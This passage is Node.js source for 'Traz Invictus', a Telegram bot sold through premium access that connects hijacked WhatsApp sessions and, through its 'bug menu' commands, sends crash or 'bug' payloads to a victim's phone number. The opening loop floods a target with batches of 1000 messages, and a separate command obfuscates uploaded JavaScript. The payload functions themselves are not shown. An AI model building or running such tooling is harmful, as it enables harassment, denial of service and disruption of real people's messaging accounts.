        count++;
        setTimeout(sendNext, 1000);
      } else {
        console.log(chalk.green(`✅ Success Sending 1000 messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
        setTimeout(sendNext, 150);
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);

      setTimeout(sendNext, 100);
    }
  };

  sendNext();
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  await bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`♣тяαz-ιηνι¢тυѕ
┏─────────────────────────
┏  ┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┛
╏ Bot name : Traz Invictus
╏ Version Bot ; 2.6
╏ New Developer : t.me/KipopLecy
┗  ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓
┗─────────────────────────
╭─────────────────────╮
 ☐ User Id : ${senderId}
 ☐ Username : ${username}
 ☐ Status : ${premiumStatus}
 ☐ Bot Total : ${sessions.size}
╰─────────────────────╯

Caption : 
Не используйте эту функцию ошибок в скриптах безрассудно, если вы используете ее не по назначению. Это означает, что вы завистник, который охотно обманывает людей ради удовольствия.
\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "🔐 Unlock", callback_data: "back" }]],
    },
  });

  const audioPath = path.join(__dirname, "./Audio/TrazAudio.mp3");
  await bot.sendAudio(chatId, audioPath, {
    caption: ` Traz Invictus 2.6 x Vibes 🤓`,
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const premiumStatus = getPremiumStatus(senderId);
    const runtime = getBotRuntime();
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug_menu") {
      caption = `\`\`\`♣тяαz-ιηνι¢тυѕ
┏─────────────────────────
┏  ┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┛
╏ Bot name : Traz Invictus
╏ Version Bot ; 2.6
╏ New Developer : t.me/KipopLecy
┗  ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓
┗─────────────────────────
┏
┃☐ User Id : ${senderId}
┃☐ Username : ${username}
┃☐ Status : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━  

┏━━『 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 』
┃╭─────────────────
╿│☐ ⧽ /ᴅᴇʟʟᴀʏxᴏɴᴇ × ɴᴏ
╿│☐ ⧽ /ᴅᴇʟʟᴀʏxᴛᴡᴏ × ɴᴏ
╿│☐ ⧽ /ᴅᴇʟʟᴀʏxᴛʜʀᴇᴇ × ɴᴏ
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "B͜͡Ḁ̊C̥̊͡K̷͜", callback_data: "back" }]],
      };
    }

    if (query.data === "owner_menu") {
      caption = `\`\`\`♣тяαz-ιηνι¢тυѕ
┏─────────────────────────
┏  ┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┛
╏ Bot name : Traz Invictus
╏ Version Bot ; 2.6
╏ New Developer : t.me/KipopLecy
┗  ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓
┗─────────────────────────
┏
┃☐ User Id : ${senderId}
┃☐ Username : ${username}
┃☐ Status : ${premiumStatus}
┗━━━━━━━━━━━━━━━━━━━━

┏━━『 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 』
┃╭─────────────────
╿│☐ ⧽ /ᴀᴅᴅᴀᴅᴍɪɴ × ɪᴅ
╿│☐ ⧽ /ᴅᴇʟᴀᴅᴍɪɴ × ɪᴅ
╿│☐ ⧽ /sᴇᴛᴄᴅ × ᴛɪᴍᴇ
╿│☐ ⧽ /ᴄᴏɴɴᴇᴄᴛ × ɴᴏ
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
┏━━『 𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨 』
┃╭─────────────────
╿│☐ ⧽ /ᴀᴅᴅᴘʀᴇᴍ × ɪᴅ
╿│☐ ⧽ /ᴅᴇʟᴘʀᴇᴍ × ɪᴅ
┃╰─────────────────
┕━━━━━━━━━━━━━━━━━━━━━━━━━━
\`\`\``;
      replyMarkup = {
        inline_keyboard: [[{ text: "B͜͡Ḁ̊C̥̊͡K̷͜", callback_data: "back" }]],
      };
    }

    if (query.data === "back") {
      if (
        !premiumUsers.some(
          (user) =>
            user.id === senderId && new Date(user.expiresAt) > new Date()
        )
      ) {
        return bot.sendPhoto(chatId, randomImage, {
          caption: `❌ What ${query.from.username} ? Do you want to open the menu feature? Use premium access to open menu features`,
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [{ text: "ꙆᙁᖴOᖇᙏඞƮꙆOᙁ", url: "https://t.me/traz_Invictus" }],
            ],
          },
        });
      }

      caption = `\`\`\`♣тяαz-ιηνι¢тυѕ
┏─────────────────────────
┏  ┗╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┛
╏ Bot name : Traz Invictus
╏ Version Bot ; 2.6
╏ New Developer : t.me/DG_KinoX
┗  ┏╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍╍┓
┗─────────────────────────
╭─────────────────────╮
 ☐ User Id : ${senderId}
 ☐ Username : ${username}
 ☐ Status : ${premiumStatus}
 ☐ Bot Total : ${sessions.size}
╰─────────────────────╯

Caption : 
Не используйте эту функцию ошибок в скриптах безрассудно, если вы используете ее не по назначению. Это означает, что вы завистник, который охотно обманывает людей ради удовольствия.
\`\`\``;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "АВАРИЙНОЕ МЕНЮ", callback_data: "bug_menu" },
            { text: "МЕНЮ ВЛАДЕЛЬЦА", callback_data: "owner_menu" },
          ],
        ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//

bot.onText(/\/dellayxone\s(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/DG_KinoX" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/t0tj26.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
      await Function01(30, jid);
      await new Promise((resolve) => setTimeout(resolve, 500));
      await ComboXfunc(30, jid);
    console.log("SUKSES MENGIRIM BUG⚠️");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/dellayxtwo\s(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/DG_KinoX" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/t0tj26.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
      await Function02(30, jid);
      await new Promise((resolve) => setTimeout(resolve, 500));
      await ComboXfunc02(30, jid);
    console.log("SUKSES MENGIRIM BUG⚠️");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/dellayxthree\s(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry you don't have access to use this command yet..",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Ꝋ所有者", url: "https://t.me/DG_KinoX" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/t0tj26.jpg",
      {
        caption: `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙿𝚁𝙾𝚂𝙴𝚂 🔃
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [□□□□□□□□□□] 0%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        parse_mode: "Markdown",
      }
    );

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■□□□□□□□□□] 10%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■□□□□□□□] 30%", delay: 200 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■□□□□□] 50%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■□□□] 70%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■□] 90%", delay: 100 },
      { text: "▢ 𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%\n✅ 𝙱𝚄𝙶 𝚂𝚄𝙺𝚂𝙴𝚂🎉", delay: 200 },
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
──────────────────────────
 ▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
 ▢ 𝙸𝙽𝙵𝙾 : Proses Tahap 2 ... 🔃
 ${stage.text}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(
      `
\`\`\`
╭━━『 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 』━━
┃╭────────────────
┃│𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 : ${chatId}
┃│𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
┃│𝚃𝙾𝚃𝙰𝙻 𝙱𝙾𝚃 : ${sessions.size}
┃│𝚂𝚃𝙰𝚃𝚄𝚂 : 𝙳𝙾𝙽𝙴 ✅
┃│𝙿𝚁𝙾𝚂𝙴𝚂 : [■■■■■■■■■■] 100%
┃╰────────────────
╰━━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝙸𝙽𝙵𝙾 𝚃𝙰𝚁𝙶𝙴𝚃", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("PROSES MENGIRIM BUG");
      await Function03(30, jid);
      await new Promise((resolve) => setTimeout(resolve, 500));
      await ComboXfunc(30, jid);
      await new Promise((resolve) => setTimeout(resolve, 2000));
      await ComboXfunc02(30, jid);
    console.log("SUKSES MENGIRIM BUG⚠️");

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// Enc Fiture

bot.onText(/\/encrypt/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id.toString();

  // Cek apakah balas pesan dengan file
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(
      chatId,
      "❌ *Error:* Balas file .js dengan `/encrypt`!",
      { parse_mode: "Markdown" }
    );
  }

  const file = msg.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return bot.sendMessage(
      chatId,
      "❌ *Error:* Hanya file .js yang didukung!",
      { parse_mode: "Markdown" }
    );
  }

  const encryptedPath = path.join(__dirname, `Traz-Encrypt-${file.file_name}`);

  try {
    const progressMessage = await bot.sendMessage(
      chatId,
      "🔃 Memulai proses enkripsi..."
    );

    await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

    // **Perbaikan pengambilan file dari Telegram**
    const fileData = await bot.getFile(file.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    let fileContent = response.data.toString("utf-8");

    await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

    // Cek apakah file valid sebelum dienkripsi
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
    }

    await updateProgress(
      bot,
      chatId,
      progressMessage,
      40,
      "Inisialisasi Enkripsi"
    );

    // Proses enkripsi menggunakan Vincent Chaos Core
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getTrazObfuscationConfig()
    );
    let obfuscatedCode = obfuscated.code || obfuscated;

    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    // Cek apakah hasil enkripsi valid
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(
      bot,
      chatId,
      progressMessage,
      80,
      "Finalisasi Enkripsi"
    );

    await fs.promises.writeFile(encryptedPath, obfuscatedCode);

    // Kirim file hasil enkripsi
    await bot.sendDocument(chatId, encryptedPath, {
      caption: "✅ Sukes Ecnrypt By @kipopLecy",
      parse_mode: "Markdown",
    });

    await updateProgress(
      bot,
      chatId,
      progressMessage,
      100,
      "Vincent Chaos Core Selesai"
    );

    // Hapus file setelah dikirim
    try {
      await fs.promises.access(encryptedPath);
      await fs.promises.unlink(encryptedPath);
    } catch (err) {
      console.error("Gagal menghapus file:", err.message);
    }
  } catch (error) {
    await bot.sendMessage(
      chatId,
      `❌ *Kesalahan:* ${
        error.message || "Tidak diketahui"
      }\n_Coba lagi dengan kode Javascript yang valid!_`,
      { parse_mode: "Markdown" }
    );

    // Hapus file jika ada error
    try {
      await fs.promises.access(encryptedPath);
      await fs.promises.unlink(encryptedPath);
    } catch (err) {
      console.error("Gagal menghapus file:", err.message);
    }
  }
});

//=======plugins=======//
bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require("moment");

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d."
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d."
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d."
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }

  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );

  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addadmin 6843967527."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna adalah owner atau admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Please provide a user ID. Example: /delprem 6843967527"
    );
  }

  const userId = parseInt(match[1]);

  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }

  // Cari index user dalam daftar premium
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }

  // Hapus user dari daftar
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `✅ User ${userId} has been removed from the premium list.`
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  // Pengecekan input dari pengguna
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /deladmin 6843967527."
    );
  }

  // Cari dan hapus user dari adminUsers
  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
